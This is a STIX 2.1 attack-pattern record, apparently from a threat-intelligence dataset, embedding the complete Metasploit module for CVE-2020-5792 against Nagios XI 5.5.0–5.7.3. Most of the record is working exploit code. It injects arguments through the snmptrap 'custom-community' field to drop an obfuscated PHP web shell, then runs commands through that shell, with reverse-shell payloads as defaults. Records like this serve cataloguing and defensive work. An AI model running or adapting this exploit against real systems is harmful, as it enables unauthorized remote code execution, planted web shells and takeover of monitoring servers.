{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8345ca98-2ec6-4609-bf8c-16449ac375cf",
    "created": "2024-08-14T17:02:47.864393Z",
    "modified": "2024-08-14T17:02:47.864397Z",
    "name": "Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection",
    "description": " This module exploits an OS command injection vulnerability in includes/components/nxti/index.php that enables an authenticated user with admin privileges to achieve remote code execution as the `apache` user. The module uploads a simple PHP shell via includes/components/nxti/index.php to includes/components/autodiscovery/jobs/<php_shell> and then executes the payload as the `apache` user via an HTTP GET request to includes/components/autodiscovery/jobs/<php_shell>?<php_param>=<cmd>  Valid credentials for a Nagios XI admin user are required. This module has been successfully tested against Nagios XI 5.7.3 running on CentOS 7.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_snmptrap_authenticated_rce.rb",
            "external_id": "nagios_xi_snmptrap_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5792"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI 5.5.0-5.7.3 - Snmptrap Authenticated Remote Code Exection',\n        'Description' => %q{\n          This module exploits an OS command injection vulnerability in\n          includes/components/nxti/index.php that enables an authenticated user\n          with admin privileges to achieve remote code execution as the `apache`\n          user. The module uploads a simple PHP shell via includes/components/nxti/index.php\n          to includes/components/autodiscovery/jobs/<php_shell> and then\n          executes the payload as the `apache` user via an HTTP GET request to\n          includes/components/autodiscovery/jobs/<php_shell>?<php_param>=<cmd>\n\n          Valid credentials for a Nagios XI admin user are required. This module has\n          been successfully tested against Nagios XI 5.7.3 running on CentOS 7.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Chris Lyne', # discovery\n          'Erik Wynter' # @wyntererik - Metasploit'\n        ],\n        'References' => [\n          ['CVE', '2020-5792']\n        ],\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux (x86/x64)', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => [ARCH_CMD],\n              'Platform' => 'unix',\n              # cmd/unix/reverse_awk is one of the few reliable CMD payloads for a typical NagiosXI install (CentOS 7 minimal).\n              # other options are cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_awk' }\n            }\n          ],\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-10-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])\n    ]\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def finish_install\n    datastore['FINISH_INSTALL']\n  end\n\n  def check\n    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns\n    # an array containing the http response body of a GET request to index.php and the session cookies\n    login_result, res_array = nagios_xi_login(username, password, finish_install)\n    case login_result\n    when 1..3 # An error occurred\n      return CheckCode::Unknown(res_array[0])\n    when 4 # Nagios XI is not fully installed\n      install_result = install_nagios_xi(password)\n      if install_result\n        return CheckCode::Unknown(install_result[1])\n      end\n\n      login_result, res_array = login_after_install_or_license(username, password, finish_install)\n      case login_result\n      when 1..3 # An error occurred\n        return CheckCode::Unknown(res_array[0])\n      when 4 # Nagios XI is still not fully installed\n        return CheckCode::Detected('Failed to install Nagios XI on the target.')\n      end\n    end\n\n    # when 5 is excluded from the case statement above to prevent having to use this code block twice.\n    # Including when 5 would require using this code block once at the end of the `when 4` code block above, and once here.\n    if login_result == 5 # the Nagios XI license agreement has not been signed\n      auth_cookies, nsp = res_array\n      sign_license_result = sign_license_agreement(auth_cookies, nsp)\n      if sign_license_result\n        return CheckCode::Unknown(sign_license_result[1])\n      end\n\n      login_result, res_array = login_after_install_or_license(username, password, finish_install)\n      case login_result\n      when 1..3\n        return CheckCode::Unknown(res_array[0])\n      when 5 # the Nagios XI license agreement still has not been signed\n        return CheckCode::Detected('Failed to sign the license agreement.')\n      end\n    end\n\n    print_good('Successfully authenticated to Nagios XI')\n\n    # Obtain the Nagios XI version\n    @auth_cookies = res_array[1] # if we are here, this cannot be nil since the mixin checks for that already\n\n    nagios_version = nagios_xi_version(res_array[0])\n    if nagios_version.nil?\n      return CheckCode::Detected('Unable to obtain the Nagios XI version from the dashboard')\n    end\n\n    print_status(\"Target is Nagios XI with version #{nagios_version}\")\n\n    if /^\\d{4}R\\d\\.\\d/.match(nagios_version) || /^\\d{4}RC\\d/.match(nagios_version) || /^\\d{4}R\\d.\\d[A-Ha-h]/.match(nagios_version) || nagios_version == '5R1.0'\n      nagios_version = '1.0.0' # Set to really old version as a placeholder. Basically we don't want to exploit these versions.\n    end\n\n    # check if the target is actually vulnerable\n    version = Rex::Version.new(nagios_version)\n    if version >= Rex::Version.new('5.5.0') && version <= Rex::Version.new('5.7.3')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def alert_exploit_attempt(payload_string)\n    payload_execution = \"#{normalize_uri(target_uri.path, 'includes', 'components', 'autodiscovery', 'jobs', @php_log_file)}?#{@php_param}=<cmd>\"\n    print_status(\"Attempting to execute the #{payload_string} via `#{payload_execution}`\")\n  end\n\n  def upload_php_shell\n    # prepare the variables we need\n    @php_param = rand_text_alpha(1) # this does not work with longer parameters\n    php_shell = \"<?php /*      */system(/*     */$_GET[\\\"#{@php_param}\\\"])/* */?>\"\n    encoded_payload = Rex::Text.to_hex(php_shell)\n    encoded_payload.gsub!('\\x', '') # get clean hex without the \\x format\n    @php_log_file = \"#{rand_text_alpha(8..12)}.php\"\n    php_log_file_path = \"/usr/local/nagiosxi/html/includes/components/autodiscovery/jobs/#{@php_log_file}\"\n    register_file_for_cleanup(php_log_file_path)\n\n    # upload the shell\n    print_status(\"Uploading a simple PHP shell to #{php_log_file_path}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'nxti', 'index.php'),\n      'cookie' => @auth_cookies,\n      'vars_get' =>\n      {\n        'custom-version' => '2c',\n        'generic-trap-option' => '0',\n        'specific-trap-option' => '',\n        'custom-agent' => '',\n        'custom-community' => \"a -d -L f #{php_log_file_path}\",\n        'custom-oid' => 'NET-SNMP-EXAMPLES-MIB::netSnmpExampleHeartbeatNotification',\n        'variablebindings[name][]' => 'x',\n        'variablebindings[type][]' => 'x',\n        'variablebindings[value][]' => encoded_payload,\n        'mode' => 'customTrap'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to upload the PHP shell')\n    end\n\n    unless res.code == 200 && res.body.include?('var message = \"Custom trap sent successfully!\";')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to upload the PHP shell')\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'includes', 'components', 'autodiscovery', 'jobs', @php_log_file),\n      'cookie' => @auth_cookies,\n      'vars_get' => { @php_param => cmd }\n    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n  end\n\n  def exploit\n    upload_php_shell # upload a simple php shell that will be used to execute the payload\n    if target.arch.first == ARCH_CMD\n      alert_exploit_attempt('payload')\n      execute_command(payload.encoded)\n    else\n      alert_exploit_attempt('initial payload')\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}